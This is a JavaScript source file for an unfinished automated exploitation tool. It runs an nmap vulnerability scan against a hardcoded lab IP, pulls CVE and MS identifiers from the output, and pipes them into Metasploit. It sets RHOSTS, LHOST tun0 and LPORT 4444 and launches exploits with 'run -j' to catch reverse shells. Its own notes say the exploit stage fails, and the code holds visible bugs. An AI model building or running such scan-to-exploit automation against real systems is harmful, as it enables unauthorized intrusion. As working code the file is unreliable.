/*
NOTES : 
    - This is a work in progress
    ERROR : Line 121: Cannot Read Properties of null (reading 'write)

    NMAP SCAN = Working
    GET GET VULN = Working
    EXPLOIT = Not Working

    Possible Solution:
    - Read line by line and check if the line contains the string 'CVE-' or 'ms'
      - Get the CVE or MS number + the exploit name
        - Use the exploit name to get the exploit path
            - Use the exploit path to run the exploit

    - Possible Solution 2:
        - Use the exploit name to get the exploit path
            - Use the exploit path to run the exploit

    - Possible Solution 3:
        - Work out the system OS
            - Filter based on OS
                - List all exploits to a file
                    - Read the file and get the exploit path
                        - Use the exploit path to run the exploit

    
    NOTE :
    
    Readline should print the msf console line by line and not work using the buffer.
    This will allow filtering line by line and not having to manipulate a large buffer.
    This will also allow the user to see the msf console in real time.

    TO DO : 
        - User input for IP
        - User input for local network adaptor

        - Filter the exploits based on the OS

        
 

*/


const { exec, spawn} = require('child_process');
const chalk = require('chalk');
const axios = require('axios');
const Spinnies = require('spinnies');
const spinner = new Spinnies();
const data_spinner = new Spinnies();
const fs = require('fs');
const {chunksToLinesAsync, chomp} = require('@rauschma/stringio');

const log = require('./modules/utils.js');
const { colorOptions } = require('spinnies/utils.js');

// global variables
const cves = [];
const mses = [];
var ip = '10.129.250.42'

const logo = `

██▒   █▓ █    ██  ██▓     ███▄    █    ▓█████ ▒██   ██▒▓█████  ▄████▄  
▓██░   █▒ ██  ▓██▒▓██▒     ██ ▀█   █    ▓█   ▀ ▒▒ █ █ ▒░▓█   ▀ ▒██▀ ▀█  
 ▓██  █▒░▓██  ▒██░▒██░    ▓██  ▀█ ██▒   ▒███   ░░  █   ░▒███   ▒▓█    ▄ 
  ▒██ █░░▓▓█  ░██░▒██░    ▓██▒  ▐▌██▒   ▒▓█  ▄  ░ █ █ ▒ ▒▓█  ▄ ▒▓▓▄ ▄██▒
   ▒▀█░  ▒▒█████▓ ░██████▒▒██░   ▓██░   ░▒████▒▒██▒ ▒██▒░▒████▒▒ ▓███▀ ░
   ░ ▐░  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░░ ▒░   ▒ ▒    ░░ ▒░ ░▒▒ ░ ░▓ ░░░ ▒░ ░░ ░▒ ▒  ░
   ░ ░░  ░░▒░ ░ ░ ░ ░ ▒  ░░ ░░   ░ ▒░    ░ ░  ░░░   ░▒ ░ ░ ░  ░  ░  ▒   
     ░░   ░░░ ░ ░   ░ ░      ░   ░ ░       ░    ░    ░     ░   ░        
      ░     ░         ░  ░         ░       ░  ░ ░    ░     ░  ░░ ░      
     ░                                                         ░        
`;
console.clear();
fs.writeFile('nmap.txt', '', (err) => {
    if(err) {
        log.error(err);
    }
});
console.log(chalk.redBright(logo));

// REMOVE THE COMMENT HERE
setTimeout(() => {
    log.vuln('VULN EXEC LOADED');
    nmap_scan(ip);
}, 2000);

nmap_scan = async (ip) => {
    const nmap = spawn('nmap', ['-sS', '-sV', '-T5','--script','vuln', ip]);
    nmap.stdout.on('data', (data) => {
        data = data.toString();

        if(data.includes('Starting Nmap')) {
            spinner.add('nmap', {text: 'Nmap Scan Started', color: 'red'});
        } else if(data.includes('Nmap done')) {
            spinner.succeed('nmap', {text: 'Nmap Scan Completed', color: 'red'});
            spinner.add('get_data', {text: 'Getting Vulnerabilities', color: 'red'});
            get_vuln();
        }  else {
            
        }
        fs.appendFile('nmap.txt', data, (err) => {
            if(err) {
                log.error(err);
            }
        } )
    });

    nmap.stderr.on('data', (data) => {
        log.error(data);
    });
    
}

// msf exploit(multi/handler) > use exploit/multi/handler

const get_vuln = async () => {
    const data = fs.readFileSync('nmap.txt', 'utf8');
    const cve = data.match(/CVE-\d{4}-\d{4,7}/g) // CVE-2017-0143
    const ms = data.match(/ms\d{2}-\d{3}/g) // ms12-345


    let combo = []

    cve.toString().split(',').forEach((item) => {
        cves.push(item); // Itterates through the string and puts to array
    });

    ms.toString().split(',').forEach((item) => {
        mses.push(item); // Itterates through the string and puts to array
    });

    for (let i = 0; i < cves.length; i++) {
        
        combo.push(cves[i]); // PUSHES CVE TO COMBO
    }

    for (let i = 0; i < mses.length; i++) {
        combo.push(mses[i]); // PUSHES MS TO COMBO
    }

    if(combo.length > 0) {
        spinner.succeed('get_data', {text: 'Vulnerabilities Found', color: 'red'});
        log.vuln(`Found ${cves.length} CVEs and ${mses.length} MSs`)
        log.vuln(`Found ${combo.length} Total Vulnerabilities`)
        log.vuln(`[${combo}]`)

        exploit(combo, ip) // msf exploit
        
    } else {
        spinner.fail('get_data', {text: 'No Vulnerabilities Found', color: 'red'});
        log.info('No Vulnerabilities Found'); 
    }

}

//msf exploit 
const exploit = async (combo, ip) => {
    var options = { stdio: ["ignore", "pipe", process.stderr] };
    spinner.add('exploit', {text: 'Exploiting', color: 'red'});
    
    for (let i = 0; i < combo.length; i++) {
        const msf = spawn('msfconsole', ['-q'], options);
        msf.stdin.write(`search ${combo[i]}`) // HERE IS WHERE THE ERROR OCCURS
        await echoReadable(msf.stdout);
    }
        
}


async function echoReadable(readable) {
    for await (const line of chunksToLinesAsync(readable)) { // (C)
      console.log('LINE: '+chomp(line))

      if (line.includes('exploit/')) {
        number = line.match(/\d+/g).map(Number);
        console.log(number)
        msf.stdin.write(`use ${number}`)
        msf.stdin.write(`set RHOSTS ${ip}`)
        msf.stdin.write('set LHOST tun0')
        msf.stdin.write('set LPORT 4444')
        msf.stdin.write('run -j')

      }
    }
  }